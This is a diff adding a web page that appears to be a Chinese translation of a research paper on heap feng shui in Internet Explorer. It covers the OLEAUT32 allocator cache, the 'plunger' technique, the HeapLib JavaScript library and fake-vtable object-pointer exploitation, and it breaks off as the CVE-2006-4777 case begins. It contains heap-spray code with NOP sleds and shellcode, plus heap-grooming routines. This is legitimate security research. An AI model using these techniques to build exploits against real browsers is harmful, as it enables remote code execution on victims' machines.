@@ -1,0 +1,566 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="5fab07fbb1a4114702b96fbcc0ebd82c">Introduction</h1>
+<p>从XP SP2到来起，Windwos堆漏洞的利用变得越来越难。堆保护机制像是safe unlinking和heap cookies已经成功的让许多通用的堆利用技术失效。当然，存在绕过堆保护的方法，但是这些方法往往要需要控制漏洞程序的分配模式。<br/>
+本文将会介绍一个新的技术，（+++通过特定的javascript分配序列精确操作浏览器的堆布局+++），我们提供了一个JavaScript的库，里面包含用于在触发堆损坏错误之前在受控状态下设置堆的函数。这能使我们能更有效和准确地利用一些非常难利用的堆漏洞。</p>
+<h2 data-content="1" id="f72b4f2e60ddebec367f5f076e439c96">Previous work</h2>
+<p>最为广泛使用的浏览器堆漏洞利用技术是SkyLined为IE iframe利用而出现的堆喷射技术。这个方法使用JavaScript创建大量由Nop和shellcode组成的字符串。JavaScript运行的时候会将每一个字符串的数据存储在堆中的新块上。堆的分配通常从起始地址向上增长。在为字符串分配了200MB的内存之后，会发现在50MB和200MB之间的任何地址大多都指向Nop指令。在用这个范围内的地址覆盖返回地址或者一个函数指针之后，程序将会被控制跳转执行到这些NOP指令并且让shellcode执行。<br/>
+下面举一个JavaScript代码的例子来说明：</p>
+<pre><code>var nop = unescape("%9090%u9090");
+//创建一个1MB的带有shellcode的NOP指令字符串，
+//
+// malloc header    string length   NOP slide   shellcode   NULL terminator
+//32 bytes      4 bytes     x bytes     y bytes     2 bytes
+while(nop.length &lt;= 0x100000/2) nop += nop;
+nop = nop.substring(0,0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2)
+var x = new Array();
+//用NOP和shellcode填充200MB的内存空间
+for(var i = 0; i &lt; 200; i++){
+    x[i] = nop + shellcode;
+}</code></pre>
+<p>对这项技术进行轻微的改动可以对虚表和对象指针的覆盖进行利用。如果一个对象的指针调用一个虚函数，编辑器生成的代码大致是这样：</p>
+<pre><code>mov ecx, dword ptr [eax]  ;得到虚表地址
+push eax                  ;C++用this指针传递第一个参数
+call dword ptr[rcx + 08h] ;调用在虚表内偏移为0x8h的函数</code></pre>
+<p>每个C++对象的前四个字节都包含一个指向虚表的指针。为了利用一个被覆盖的对象指针，我们需要使用指向一个伪造对象的地址，该对象包含一个伪造的虚表，其中包含了shellcode的指针。而事实证明在内存中建立这样的结构并不像想象中的那么难。第一步是使用一系列的0xC字节序列作为滑板指令，然后用一个指向这些滑板指令的地覆盖对象指针.伪造对象开始的虚表指针将会指向0x0C0C0C0C.内存里也包含了0xOC这样的字节序列，所以虚表里的所有虚表指针都会指向0x0C0C0C0C。调用任何该虚表中的虚函数的结果都会执行shellcode。<br/>
+下面是这一系类的过程：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306102031-f1b30d72-20e4-1.png"/><br/>
+SkyLined的技术关键在于JavaScript代码可以访问堆系统。本来将进一步讨论这个问题，并且将会探讨如何使用JavaScript代码完全控制堆。</p>
+<h2 data-content="1" id="2c9328b994388e5bd84c25604e920158">MOVTIVATION</h2>
+<p>虽然上述的堆喷射技术有着很好的效果，但是单独使用堆喷并不可靠。有两个理由。<br/>
+在Windwos XP SP2及以上更早的版本覆盖堆中的数据相比通过破坏malloc内部的数据结构更容易对堆漏洞进行利用，后来因为堆分配器对malloc块头和双链表的空闲块执行附加验证，这使得标准堆利用方法失效。因此，许多对漏洞的利用是通过堆喷技术让shellcode填充地址空间，然后尝试覆盖堆上的对象或虚表指针。虽然操作系统中的堆保护不扩展到存储在内存中的应用程序数据，但是堆的状态很难预测，所以不能保证被覆盖的内存总是包含相同的数据。在这种情况下exp可能会失效。</p>
+<p>其中一个例子就是Metasploit框架中的ie_webview_setslice漏洞。它再次出发了一个对漏洞，希望在堆中足够多的垃圾数据能够到使程序跳转执行到一个随机的堆地址中。当然结果如人所料，这样的漏洞利用方式并不总是成功的。</p>
+<p>第二个问题是利用该漏洞的可靠性和堆喷消耗的系统内存量之间的权衡问题。如果一个EXP用shellcode把浏览器的地址空间完全填充，当然这样任意的跳转都可以使shellcode得到执行，但是系统的物理内存毕竟是有限的，这样使用很多的内存页的堆喷会降低系统性能。而且如果攻击者在堆喷射完成之前关闭了浏览器，此次堆喷就会失败。</p>
+<p>这篇文章将会演示如何解决这两个问题来使漏洞的利用更加有效可靠。</p>
+<h1 data-content="1" id="e2bdb0f32bbbd96646a18480d3ccec58">Internet Explorer heap internals</h1>
+<h2 data-content="1" id="9bbc69cd7961cc1a39fca55852d16aab">OVERVIEW</h2>
+<p>通常情况下，浏览器中经用来破坏利用的堆内存由三个主要的组件所分配。第一个是MSHTML.DLL负责管理当前页面上显示的HTML元素的内存。它在页面的初始化阶段和随后的DHTML操作中分配内存。内存是从默认进程堆中分配的，当页面关闭或HTML元素被销毁时，内存被释放。</p>
+<p>管理内存的第二个组件是JavaScript引擎中的JSCRIPT.DLL。除了从默认进程堆分配的字符串之外，新的JavaScript对象的内存是从专用的JavaScript堆中分配的。当总内存消耗或对象数量超过特定阈值时，垃圾收集器会运行并销毁未引用的对象。也可以通过调用CollectGarbage（）函数显式地触发垃圾收集器进行多余对象的回收。</p>
+<p>最后一个组件是在堆漏洞利用中经常引发堆漏洞的ActiveX。某些ActiveX控件使用专用的堆，但大多数还是会在默认进程堆上分配和损坏内存。</p>
+<p>值得注意的是Internet Explorer的三个组件使用相同的默认进程堆。这意味着使用JavaScript分配和释放内存会改变MSHTML和ActiveX控件使用的堆的布局，同样我们可以使用ActiveX控件中的堆损坏错误来覆盖其他两个浏览器组件分配的内存。</p>
+<h2 data-content="1" id="3534063dfd717aeac3d033146787d964">JavaScript strings</h2>
+<p>JavaScript引擎大部分内存是通过使用MSVCRT malloc（）和new（）函数来分配，在CRT初始化期间使用专用的堆。一个重要的例外是JavaScript字符串的数据。它们被存储为BSTR字符串，这是COM接口使用的基本字符串类型。它们的内存由OLEAUT32.DLL中SysAllocString函数族的默认进程堆分配。</p>
+<p>要在堆上分配一个新的字符串，我们需要创建一个新的JavaScript字符串对象。 我们不能简单地将字符串文字分配给一个新的变量，因为这不会对数据进行拷贝创建新字符串。另一方面，我们可以通过连接两个字符串或使用substr函数来创建，例如：</p>
+<pre><code>var str1 = "AAAAAAAA"          //不会分配一个新的字符串
+var str2 = str1.substr(0,10);  //分配一个新的10个字符的字符串
+var str3 = str1 + str2;        //分配一个新的20个字符的字符串</code></pre>
+<p>BSTR字符串作为包含四字节大小字段的结构存储在内存中，后面跟着字符串数据为16位宽字符，以及一个16位空终止符.上例中的str1字符串在内存中将具有以下表示形式：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306102222-341a5bac-20e5-1.png"/><br/>
+我们可以使用以下两个公式来计算一个字符串分配多少个字节，或者一个字符串必须分配多少字节数：</p>
+<pre><code>bytes - len * 2 + 6 
+len = (bytes - 6) / 2
+字符串存储的方式允许我们通过一个覆盖任意大小的内存块的函数来实现分配一个新字符串。代码将使用len =（bytes-6）/ 2公式计算所需的字符串长度，并且调用substr 分配一个对应长度的新字符串。该字符串将使用复制的数据填充字符串。如果我们要将特定的数据放入新的内存块，我们只需要事先初始化填充字符串。
+//用填充数据构建一个长字符串
+padding = "AAAA"
+while(padding.length &lt; MAX_ALLOCATION_LENGTH)
+    padding = padding + padding;
+//按字节分配指定大小的内存块
+function alloc(bytes){
+    return padding.substr(0, (bytes-6)/2);</code></pre>
+<h2 data-content="1" id="7d3885ce7889ea15d4ccf8addad5f0cc">Garbage collection</h2>
+<p>要操纵浏览器堆布局，只能分配任意大小的内存块是不够的，我们还需要使用某种方法来释放它们。JavaScript运行时使用一个mark-and-sweep垃圾回收器，Eric Lippert博客上的一篇文章有详细描述(<a href="http://blogs.msdn.com/ericlippert/archive/2003/09/17/53038.aspx)。" target="_blank">http://blogs.msdn.com/ericlippert/archive/2003/09/17/53038.aspx)。</a></p>
+<p>垃圾收集是由各种启发式触发的，例如程序最后运行时创建的对象。mark-and-sweep算法标识JavaScript运行时中的所有未被引用的对象并销毁它们。当一个字符串对象被销毁时，通过调用OLEAUT32.DLL中的SysFreeString来释放它,这是垃圾收器的回溯：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306103405-d6a137d2-20e6-1.png"/></p>
+<p>为了释放我们分配的其中一个字符串，我们需要运行垃圾回收器删除它的所有引用。幸运的是，我们不必等待一个触发器，因为JavaScript在Internet Explorer中提供了一个CollectGarbage（）函数，该函数会强制垃圾收集器运行。 该函数功能如下代码所示：</p>
+<pre><code>var str;
+//我们需要在一个函数内进行分配和释放
+//否则垃圾收集器不会释放字符串
+function alloc_str(bytes){
+    str = padding.substr(0, (bytes-6)/2);
+}
+
+function free_str(){
+    str = null;
+    CollectGarbage();
+}
+
+alloc_str(0x10000);   //分配内存块
+free_str();       //释放内存块</code></pre>
+<p>上面的代码分配并释放了一个64KB的内存块，说明我们能够执行任意分配和释放默认进程堆。虽然我们只能释放由我们分配的块，但即使有这个限制，在很大程度上我们还是可以控制堆布局。</p>
+<h2 data-content="1" id="5d42743aa4d58c8e6a04decf3ff43e74">OLEAUT32 MEMORY ALLOCATOR</h2>
+<p>不幸的是，调用SysAllocString并不总是从系统堆中分配。这个函数是使用一个自定义的内存分配器来分配和释放BSTR字符串的功能是在OLEAUT32的APP_DATA类中实现的。这个内存分配器维护一个释放内存块的缓存，并在将来的分配时候将该内存块重用。</p>
+<p>高速缓存由4个bin组成，每个bin拥有一定大小范围的6个块。当一个块被APP_DATA :: FreeCachedMem（）函数释放时，它被存储在一个bin中。如果bin满了，那么在bin中最小的块会通过HeapFree（）释放并被新的块替换。而大于32767字节的块没有被缓存并且总是被直接释放。</p>
+<p>当调用APP_DATA :: AllocCachedMem（）来分配内存时，它会在适当的大小bin中查找一个空闲块。如果找到足够大的块，它将从缓存中移除并返回给调用者。否则， 该函数将分配新的内存给HeapAlloc（）</p>
+<p>内存分配的反编译代码如下所示：</p>
+<pre><code>//缓存中的每个结构都有一个大小和一个指向空闲块的指针
+struct CacheEntry
+{
+    unsigned int size;
+    void* ptr;
+}
+//高速缓存由4个容器组成，每个容器包含一定大小范围的6个块
+class APP_DATA
+{
+    CacheEntry bin_1_32      [6];   //从1到32字节的块
+    CacheEntry bin_32_64     [6];
+    CacheEntry bin_65_256    [6];
+    CacheEntry bin_257_32768 [6];
+
+    void* AllocCachedMem(unsigned long size);     //alloc函数
+    void FreeCachedMem(void* ptr);              //free函数
+};
+
+//分配内存，重用缓存中的块
+void* APP_DATA::AllocCachedMem(unsigned long size)
+{
+    CacheEntry* bin;
+    int i;
+
+    if(g_fDebNoCache == TRUE0)
+        goto system_alloc;     //如果缓存被禁用，使用HeapAlloc
+
+//为块找到大小合适的缓存容器
+    if(size &gt; 256)
+        bin = &amp;this-&gt;bin_257_32768;
+    else if(size &gt; 64)
+        bin = &amp;this-&gt;bin_65_256;
+    else if(size &gt; 32)
+        bin = &amp;this-&gt;bin_33_64;
+    else
+        bin = &amp;this-&gt;bin_1_32;
+   //遍历容器中的所有条目
+    for(i = 0; i &lt; 6; i++)
+    {
+        if(bin[i].size &gt;= size)
+        {
+            bin[i].size = 0;
+            return bin[i].ptr;
+        }
+    }
+system_alloc:
+//使用系统内存分配器分配内存
+    return HeapAlloc(GetProcessHeap(), 0, size);
+}
+
+//释放内存并将缓存中的块释放
+void APP_DATA::FreeCachedMem(void* ptr)
+{
+    CacheEntry* bin;
+    CacheEntry* entry;
+    usigned int main_size;
+    int i;
+
+    if(g_fDebNoCache == True)
+        goto system_free;
+    //获取我们正在释放的块的大小
+    size = HeapSize(GetProcessHeap(), 0, ptr);
+
+    if(size &gt; 32768)
+        goto system_free;  //使用HeapFree释放较大的块
+    else if(size &gt; 256)
+        bin = &amp;this-&gt;bin_257_32768;
+    else if(size &gt; 64)
+        bin = &amp;this-&gt;bin_65_256;
+    else if(size &gt; 32)
+        bin = &amp;this-&gt;bin_33_64;
+    else
+        bin = &amp;this-&gt;bin_1_32;
+    //迭代缓存容器中的所有条目并找到最小的条目
+    min_size = size;
+    entry = NULL;
+
+    for(i = 0; i &lt; 6; i++)
+{
+//如果我们发现一个未使用的缓存条目，将该块放在那里并返回
+        if(bin[i].size == 0)
+        {
+            bin[i].size = size;
+            bin[i].size = ptr;
+            return;
+        }
+//如果我们正在释放的块已经在缓存中，则中止
+        if(bin[i].ptr == ptr)
+            return;
+//找到最小的缓存条目
+        if(bin[i].size &lt; min_size)
+        {
+            min_size = bin[i].size;
+            entry = &amp;bin[i];
+        }
+    }
+    //如果最小的缓存条目小于我们的块，用HeapFree释放缓存的块并将其替换为新的块
+    if(min_size &lt; size)
+    {
+        HeapFree(GetProcessHeap(), 0, entry-&gt;ptr);
+        entry-&gt;size = size;
+        entry-&gt;ptr = ptr;
+        return;
+    }
+system_free:
+//使用系统内存分配器释放块
+    return HeapFree(GetProcessHeap(), 0, ptr);
+}</code></pre>
+<p>APP_DATA内存分配器使用的缓存算法存在一个问题，我们分配和释放内存的操作中只有一些由调用系统分配器实现</p>
+<h2 data-content="1" id="887a506e96fe9888292ec8d60c2dc84f">Plunger technique</h2>
+<p>由于高速缓存的每个bin中只能容纳6个block，我们通过为每个bin分配大小最大的6个块，来确保每个字符串分配都来自系统堆。这将确保所有的高速缓存分区都是空的。 那么就可以保证下一个字符串分配会对HeapAlloc（）进行调用。</p>
+<p>如果我们释放了我们分配的字符串，该字符串将进入一个高速缓存的bin中。我们可以通过释放我们在上一步中分配的6个块来将它从缓存中清除。FreeCacheMem()函数会把所有较小的块从缓存中取出，而我们的字符串将被HeapFree（）释放，此时缓存将被填满，所以我们需要为每个bin分配6个最大的块来清空它。</p>
+<p>上述的流程实际上可以总结为：我们使用6个块作为plunger，将所有较小的块从缓存中移出，然后我们再次分配6个块将plunger取出。</p>
+<p>以下代码是plunger技术的实现：</p>
+<pre><code>plunger = new Array();
+//该函数刷新缓存中的所有块，并将其置空
+function flushCache()
+{
+ // 释放plunger数组中的所有块，将所有较小的块移出
+    plunger = null;
+    CollectGarbage();
+  //为每个缓存容器分配6个最大的块，并将缓存置空
+    plunger =new Array();
+    for(i = 0; i &lt; 6; i++)
+    {
+        plunger.push(alloc(32));
+        plunger.push(alloc(64));
+        plunger.push(alloc(256));
+        plunger.push(alloc(32768));
+    }
+}
+
+flushCache();   //在进行分配操作前刷新缓存
+alloc_str(0x200);//分配字符串
+
+free_str();   //释放字符串清空缓存
+flushCache();</code></pre>
+<p>为了使用HeapFree（）把对应块从缓存中移出并释放它，块的大小必须小于它的bin的最大尺寸。否则FreeCachedMem中的min_size &lt;size条件不能被满足，plunger块将被释放。这意味着我们不能释放大小为32,64,256或32768的块，但这个限制的影响并不大。</p>
+<h3 data-content="1" id="43375abef28ce392b7fad120c38e12b6">HeapLib - JavaScript heap manipulation library</h3>
+<p>我们在一个名为HeapLib的JavaScript库中实现了前一节中描述的方法，它提供了直接映射到系统分配的alloc（）和free（）函数，以及许多更高级别的堆操作例程。</p>
+<h3 data-content="1" id="a90e2d8e57882b6e7e072943e2962435">The Hello World of HeapLib</h3>
+<p>下面是使用HeapLib库的最基本的程序：</p>
+<pre><code>&lt;script type="text/javascript" src = "heapLib.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+//为Internet Explorer创建一个heapLib对象
+    var heap = new heapLib.ie();
+//在进行分配任务之前运行垃圾收集器
+    heap.gc();
+//分配512字节并填充
+    heap.alloc(512);
+//为字符串“AAAA”分配一个新的内存块，并用“foo”标记该块
+    heap.alloc("AAAAA","foo");
+//释放所有用“foo”标记的块
+    heap.free("foo")
+&lt;/script&gt;</code></pre>
+<p>这个程序分配一个16字节的内存块并将字符串“AAAAA”复制到该块中。用“foo”标记该块并作free（）的参数。free（）函数释放内存里所有标有这个标签的块。</p>
+<p>就其对堆的影响而言，这个Hello world程序相当于以下c ++代码：</p>
+<pre><code>block1 = HeapAlloc(GetProcessHeap(), 0, 512);
+block1 = HeapAlloc(GetProcessHeap(), 0, 16);
+HeapFree(GetProcessHeap(), 0, block2);</code></pre>
+<h3 data-content="1" id="8a4cd360f8aae635b38d0a8736c7bbe5">Debugging</h3>
+<p>HeapLib提供了一些函数，可以用来调试库并检查它在堆上的效果。这里有一个简单的例子演示了调试功能：<br/>
+heap.debug("Hello!");    //输出调试信息<br/>
+heap.debugHeap(true);   //启用堆分配的跟踪调试<br/>
+heap.alloc(128, "foo");<br/>
+heao.debugBreak();       //在Windbg中断下<br/>
+heap.free("foo");<br/>
+heap.debugHeap(false);   //关闭调试</p>
+<p>查看调试输出，用WinDbg附加到IEXPLORE.EXE进程并设置以下断点：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306104016-b424cca4-20e7-1.png"/><br/>
+第一个断点断在ntdll！RtlAllocateHeap的RET指令。上面的地址对Windows xp sp2环境下有效，但是对于其他系统可能需要进行调整。断点假设默认进程堆在0x150000上.用WindDbg的uf和！ped命令可以查看这些地址：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306104112-d58ec19c-20e7-1.png"/><br/>
+设置这些断点后，运行上面的示例代码将在WinDbg中输出调试信息：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306104204-f4a3cd0c-20e7-1.png"/></p>
+<p>我们可以看到alloc（）函数在地址0x1e0b48处分配了0x80字节的内存，之后用free（）函数释放。示例程序还通过调用HeapLib中的debugBreak（）在WinDbg中触发一个断点。该函数是通过调用带有特殊参数的JavaScript acos（）函数，此函数会在WinDbg内触发jscript！JsAcos上的断点。这样我们就可以在继续执行JavaScript之前检查堆的状态。</p>
+<h2 data-content="1" id="571399a3ac9d8db41d23fa97d59b72b9">Utility functions</h2>
+<p>该库还提供了用于在开发中用来操作数据的函数。下面是使用addr（）和padding（）函数来准备虚表块的例子：</p>
+<pre><code>for(var i = 0; i &lt; 100; i++)
+{
+//将100个地址0x0C0C0C0C的副本添加到vtable
+    vtable = vtable + heap.addr(0x0C0C0C0C);
+}
+//用“A”字符填充vtable，使块大小为1008字节
+vtable = vtable +heap.padding(1008 -  (vtable.length*2+6)/2);</code></pre>
+<p>如果想了解更多具体的细节，下一节将对对应函数进行相应描述。</p>
+<h1 data-content="1" id="eaed0a85d63c75d38b5790a5774343c9">HeapLib reference</h1>
+<h2 data-content="1" id="d4e7212a7fef75304789e0adbda33b5f">Object-oriented interface</h2>
+<p>HeapLib API被实现为面向对象的接口。要在Internet Explorer中使用API，需要创建heapLib.ie类的实例。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>构造函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td>HeapLib.ie(maxAlloc,HeapBase)</td>
+<td>为Internet Explorer创建一个新的heapLib API对象。maxAlloc参数用设置块大小的最大值，可以使用alloc（）函数来分配。参数：·maxAlloc - 最大的分配大小(字节)（默认是65535）heapBase - 进程堆的默认基地址（默认是0x150000）</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>下面介绍的所有函数都是heapLib.ie类的实例方法</p>
+<h3 data-content="1" id="56ddd9e46844c60b0e2cb7268859bdf9">Debugging</h3>
+<p>将WinDbg附加到IEXPLORE.EXE进程并设置上述断点输出调试内容。如果调试器不存在，下面的函数不起作用。</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>debug(msg)</td>
+<td>在WinDbg中输出一个调试信息。msg参数必须是字符串。使用字符串连接来构建消息将导致堆分配.参数：·msg - 字符串输出</td>
+</tr>
+<tr>
+<td>debugHeap(enable)</td>
+<td>在WinDbg中启用或禁用堆操作的日志记录参数：enable - 一个boolean值，设置为true启用堆记录debugBreak() 在调试器中触发一个断点</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="1e54732b6a269dbe2c5aee6fd42f0138">Unility functions</h2>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>padding(len)</td>
+<td>返回指定长度的字符串，数量取决于在heapLib.ie构造函数中设置的最大分配大小。字符串包含“A”字符。参数：·len - 字符的长度例子：heap.padding(5)  //returns “AAAAA”</td>
+</tr>
+<tr>
+<td>round(num, round)</td>
+<td>返回一个指定值的整数参数：·num - 范围内整数·round - 取值范围例子：heap.round(210, 16)  //returns 224</td>
+</tr>
+<tr>
+<td>hex(num, width）</td>
+<td>将一个整数转换为十六进制字符串。该函数使用堆.参数：·num - 要转换的整数·（可选）转换后用的位数（不足用0填充）例子：heap.hex(210, 8)   /returns “000000D2”</td>
+</tr>
+<tr>
+<td>addr(addr)</td>
+<td>将32位地址转换为内存中具有相同表示形式的4字节字符串。此函数使用堆。参数：addr - 整数表示的地址例子：heap.addr(0x1523D200)  //返回值等价于                         //unescap(“%uD200%u1523”)</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="2561f053628aba48130f9dc3c69a9952">Memory allocation</h2>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>alloc(arg,tage)</td>
+<td>使用系统内存分配器分配一个指定大小的块。对这个函数的调用相当于调用HeapAlloc（），如果第一个参数是一个数字，它指定新块的大小，填充“A “字符。如果参数是一个字符串，则它的数据被复制到一个大小为arg.length * 2 + 6的新块中。在这两种情况下，新块的大小必须是16的倍数并且不等于32,64,256 或32768参数：·arg - 内存块的大小（以字节为单位），或者一个字符串·（可选）标识内存块的标签例子：heap.alloc(512, “foo”) //分配一个用“foo”标识的512字节大小的内存块并被“A”填充heap.alloc(“BBBBB”) //分配一个无标记的16字节大小的内存块，并将“BBBBB”拷贝进去</td>
+</tr>
+<tr>
+<td>free(tag)</td>
+<td>释放所有使用系统内存分配器分配的带有相应标记的内存块。调用此函数相当于调用HeapFree（）参数：·tag - 标识要释放的块组的标签例子：heap.free(“foo”)  //释放所有用“foo”标记的内存块</td>
+</tr>
+<tr>
+<td>gc()</td>
+<td>运行垃圾收集器并刷新OLEAUT32缓存。在使用alloc（）和free（）之前调用该函数。</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="c2051fe823ad34fe048382efe04a629b">Heap manipulation</h2>
+<p>以下函数用于在Windows 2000，xp和2003中操作内存分配器。Windows Vista中的堆分配器由于存在显着显著差异这些函数不被此系统支持。</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>freeList(arg,count)</td>
+<td>将指定大小的块添加到列表中，确保它们不合并。在调用此函数之前，必须对堆进行碎片整理。如果内存块的大小小于1024，则必须确保lookaside存满。参数：· arg - 以字节为单位的新块的大小，或strdup的一个字符串·count - 需要加进列表的块的数量（默认值是1）例子：heap.freeList(“BBBBB”,5)  //向空闲列表中添加5个包含字符串“BBBBB”的块</td>
+</tr>
+<tr>
+<td>lookaside()</td>
+<td>将指定大小的块添加到lookaside。在调用这个函数之前lookside必须为空。参数：· arg - 以字节为单位的新块的大小，或strdup的一个字符串· count - 添加到lookaside的块的数量（默认为1）例子：Heap.lookaside(“BBBBB”,5) //向lookaside中添加5个包含字符串“BBBBB”的块</td>
+</tr>
+<tr>
+<td>lookasideAddr()</td>
+<td>为指定大小的块返回后备链表头部的地址。使用heapLib.ie构造函数中的heapBase参数.参数：·arg - 以字节为单位的新块的大小，或strdup的一个字符串例子：heap.lookasideAddr(“BBBBB”) //returns 0x150718</td>
+</tr>
+<tr>
+<td>vtable(shellcode,jmpecx,size)</td>
+<td>返回一个包含shellcode的虚表。调用者应该将虚表释放到lookaside，并使用lookaside头的地址作为对象指针。当使用虚表时，对象的地址必定在eax中，和指向 vtable必定在ecx中。任何虚函数通对从ecx + 8到ecx + 0x80的虚表调用都会使shellcode执行。这个函数使用堆。参数：·shellcode - shellcode字符串·jmpecx - jmp ecx的地址或同等的指令的地址·size - 生成的虚表的大小例子：heap.vtable(shellcode, 0x4058b5)//生成一个有指针指向shellcode的大小为1008字节的虚表</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="d2c0c57667fd45fa398b2628b5ee89a0">USing HeapLIb</h2>
+<h2 data-content="1" id="6e56d252036c1afe64bdcc13e73ee2ef">Defragmenting the heap</h2>
+<p>一个影响漏洞利用的因素就是堆碎片。如果开始时堆空，我们可以通过计算并确定由特定分配序列产生的堆的状态。不过麻烦的是如果存在堆碎片，那么当我们的exp执行时我们就不知道堆的状态， 这使得堆分配器的行为不可预知。</p>
+<p>我们可以通过对堆进行碎片整理来解决这个问题。可以通过分配大量我们的漏洞利用所需的大小的块来完成，这些块将填充堆中的所有可用空间，并确保后续可以从堆的末尾分配相同大小的块。这样，分配器的行为将等同于对空堆进行操作。</p>
+<p>以下代码将对大小为0x2010字节的块进行碎片整理：</p>
+<pre><code>for(var i = 0; i &lt; 1000; i++)
+heap.alloc(0x2010)</code></pre>
+<h3 data-content="1" id="761cc8f4ea0feae751dda478cb35fc61">Putting blocks on the free list</h3>
+<p>假设我们有一段从堆中分配一块内存的代码，并在没有初始化的情况下使用它。如果我们可以控制块中的数据，我们就可以利用这个漏洞。我们需要分配一个相同大小的块，用来填写我们的数据，并释放它。然后下一次分配相同大小的块将包含我们的填入的数据。</p>
+<p>实现以上方法的唯一的障碍是系统内存分配器中的合并算法。如果我们释放的块与另一个空闲块相邻，那么它们将被合并成更大的块，接下来分配的块可能不会包含我们的数据。为了防止这种情况发生，我们将分配三个相同大小的块，并且释放中间块。首先对堆进行碎片处理确保这三个块是连续的，而且中间块不会被合并。</p>
+<pre><code>heap.alloc(0x2020);      //分配3个连续的块
+heap.alloc(0x2020, "freeList");
+heap.alloc(0x2020);
+
+heap.free("freeList");     //释放中间的块
+`</code></pre>
+<p>HeapLib库提供了一个方便的函数来实现上述技术。下面的例子展示了如何将x02020字节块添加到空闲列表中：</p>
+<pre><code>heap.freeList(0x2020);</code></pre>
+<h3 data-content="1" id="b2923e92970e8c6f0d2e6fed738acc34">Emptying the lookaside</h3>
+<p>要清空一个特定大小的lookaside列表，我们只需要分配足够大小的块。通常lookaside不超过4个块，但是我们已经在XP SP2上看到了更多entry的lookaside。我们将分配100 块，只是用来验证是否是这样。</p>
+<pre><code>for(var i = 0; i &lt; 100; i++)
+Heap.alloc(0x100);
+Freeing to the lookaside
+一旦lookaside置空，任何大小的区块在我们释放时都会被放到lookaside里
+//lookaside置空
+for(var i = 0; i &lt;100; i++)
+    heap.alloc(0x100)
+//分配块    
+heap.alloc(0x100,"foo");
+//释放块到lookaside
+heap.free("foo");
+HeapLib中的lookaside（）函数实现了这种技术：
+//lookaside置空
+for(var i = 0; i &lt; 100; i++)
+    heap.alloc("0x100");
+//向lookaside里添加三个块
+heap.lookaside(0x100);</code></pre>
+<h3 data-content="1" id="58149f80c6758feb9f64d5e585fb349c">Using the lookaside for object pointer exploitation</h3>
+<p>跟踪一个块被送进lookaside上的过程是一件很有趣的事情。让我们从一个空的lookaside列表开始。如果堆的底部是0x150000，那么大小为1008的块的lookaside头的地址将是0x151e58。因为 lookaside是空的，这时这个位置将包含一个NULL指针。</p>
+<p>现在让我们释放一个1008字节的块。在0x151e58地址处的lookaside头将指向这个释放的块，块的前四个字节将被一个NULL覆盖，表示链表的结束。此时内存中的结构看起来就像我们要利用的被覆盖的对象指针一样。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306120247-3b07b3a2-20f3-1.png"/><br/>
+如果我们用0x151e58覆盖一个对象，并释放一个包含假虚表的1008字节块，则通过虚表调用的任何虚函数都会跳转到我们选择的位置。假的虚表可以使用HeapLib库中的vtable（）函数来构建。它将一个shellcode字符串和一个跳转到ecx指令的地址作为参数，下面是分配1008字节块的数据：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180306121457-ee46595e-20f4-1.png"/><br/>
+调用这应该释放虚表到lookaside然后重写lookaside的头指针。这个假虚表的功能设计成用于调用对象指针位于eax和位于虚表地址位于ecx中的虚函数：</p>
+<pre><code>mov ecx, dword ptr [eax]   ;得到虚表的地址
+push eax                    ;C++用this指针作为第一个参数
+call dword ptr [ecx+08h]    ;调用在虚表内偏移为0x8的虚函数</code></pre>
+<p>从ecx + 8到ecx + 0x80的任何虚拟函数调用都将导致jmp ecx 指令的执行。由于ecx里存储的是指向vtable的指针，跳转将跳回到block的开始位置。最开始使用的时候它的前四个字节是包含字符串的长度，但是在它被释放到lookaside之后，它们被NULL所替代。四个零字节是作为两个add [eax]，al指令执行的。执行到达jmp + 124指令，它跳过函数指针并且落在vtable中偏移132的两个sub [eax]，al指令上。这两条指令修复了先前由sub指令损坏的内存，最后执行shellcode。</p>
+<h1 data-content="1" id="3328f0f2a0562223eac543e89242bc36">Exploiting heap vulnerabilities with HeapLib</h1>
+<h2 data-content="1" id="1cfa4ecb8b29a802deaffebb601c51bf">DirectAnimation.PathControl KeyFrame vulnerability</h2>
+<p>作为我们的第一个例子，我们将使用DirectAnimation.PathControl ActiveX控件（CVE-2006-4777）中的整数溢出漏洞。该漏洞是由创建一个ActiveX对象并调用其第一个参数大于0x7fffff的KeyFrame（）方法触发的。</p>
+<p>KeyFrame方法在Microsoft DirectAnimation SDK中记录如下：<br/>
+KeyFrame Method<br/>
+指定沿路径的x和y坐标，以及到达每个点的时间。第一个点定义路径的起始点。只有当路径停止时，才能使用或修改此方法</p>
+<p>语法：<br/>
+KeyFrameArray = Array(x1,y1, ..., xN,yN)<br/>
+TimeFrameArray = Array(time2, ..., timeN)<br/>
+pathObj.KeyFrame(npoints, KeyFrameArray, TimeFrameArray)</p>
+<p>参数：<br/>
+npoints<br/>
+ 用于定义路径的点数<br/>
